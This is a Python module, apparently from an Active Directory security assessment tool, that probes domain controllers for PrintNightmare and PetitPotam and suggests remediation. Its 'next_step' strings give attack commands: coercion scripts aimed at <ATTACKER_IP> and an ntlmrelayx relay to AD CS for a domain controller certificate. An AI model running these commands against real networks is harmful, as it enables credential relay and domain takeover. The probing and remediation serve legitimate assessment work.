"""
CVE-2021-1675 / CVE-2021-34527 — PrintNightmare
CVE-2021-36942              — PetitPotam (EFS coercion)
RPC-based probes — requires --aggressive flag.
"""

from kerb_map.modules.cves.cve_base import CVEBase, CVEResult, Severity
from kerb_map.output.logger import Logger

log = Logger()

try:
    from impacket.dcerpc.v5 import transport, rprn
    IMPACKET_OK = True
except ImportError:
    IMPACKET_OK = False


class PrintNightmare(CVEBase):
    CVE_ID = "CVE-2021-1675 / CVE-2021-34527"
    NAME   = "PrintNightmare"

    def check(self) -> CVEResult:
        log.info(f"Checking {self.CVE_ID} ({self.NAME}) [RPC probe — generates Event 5145]...")
        if not IMPACKET_OK:
            return self._not_vulnerable(self.CVE_ID, self.NAME, Severity.HIGH,
                                        "impacket not available")
        active = self._probe_spooler()
        return CVEResult(
            cve_id=self.CVE_ID, name=self.NAME, severity=Severity.CRITICAL,
            vulnerable=active,
            reason="Print Spooler reachable on DC via \\pipe\\spoolss" if active
                   else "Print Spooler pipe not reachable",
            evidence={"spooler_pipe_reachable": active},
            remediation=(
                "Disable Print Spooler on all DCs:\n"
                "  Stop-Service Spooler -Force\n"
                "  Set-Service Spooler -StartupType Disabled\n"
                "Apply KB5004945."
            ),
            next_step=(
                f"python printerbug.py {self.domain}/user:pass@{self.dc_ip} <ATTACKER_IP>\n"
                "# Pair with ntlmrelayx or responder for relay / TGT capture"
            ) if active else "",
            references=["https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527"],
        )

    def _probe_spooler(self):
        try:
            binding = f"ncacn_np:{self.dc_ip}[\\pipe\\spoolss]"
            t = transport.DCERPCTransportFactory(binding)
            t.set_credentials("", "", self.domain, "", "")
            t.set_connect_timeout(5)
            dce = t.get_dce_rpc()
            dce.connect()
            dce.bind(rprn.MSRPC_UUID_RPRN)
            dce.disconnect()
            return True
        except Exception as e:
            log.warn(f"PrintNightmare probe: {e}")
            return False


class PetitPotam(CVEBase):
    CVE_ID = "CVE-2021-36942"
    NAME   = "PetitPotam (EFS Coercion)"

    def check(self) -> CVEResult:
        log.info(f"Checking {self.CVE_ID} ({self.NAME}) [RPC probe — generates Event 5145]...")
        if not IMPACKET_OK:
            return self._not_vulnerable(self.CVE_ID, self.NAME, Severity.HIGH,
                                        "impacket not available")
        active = self._probe_efs()
        return CVEResult(
            cve_id=self.CVE_ID, name=self.NAME, severity=Severity.HIGH,
            vulnerable=active,
            reason="EFSRPC/LSARPC pipe reachable — can coerce NTLM auth" if active
                   else "EFS pipe not reachable",
            evidence={"efs_pipe_reachable": active},
            remediation=(
                "Apply KB5005413.\n"
                "Enable EPA on AD CS HTTP endpoints.\n"
                "Enable LDAP signing + channel binding on DCs."
            ),
            next_step=(
                f"python PetitPotam.py <ATTACKER_IP> {self.dc_ip}\n"
                "ntlmrelayx.py -t http://<ADCS>/certsrv/certfnsh.asp --adcs --template DomainController"
            ) if active else "",
            references=["https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942"],
        )

    def _probe_efs(self):
        try:
            from impacket.dcerpc.v5 import lsat
            binding = f"ncacn_np:{self.dc_ip}[\\pipe\\lsarpc]"
            t = transport.DCERPCTransportFactory(binding)
            t.set_connect_timeout(5)
            dce = t.get_dce_rpc()
            dce.connect()
            dce.bind(lsat.MSRPC_UUID_LSAT)
            dce.disconnect()
            return True
        except Exception as e:
            log.warn(f"PetitPotam probe: {e}")
            return False
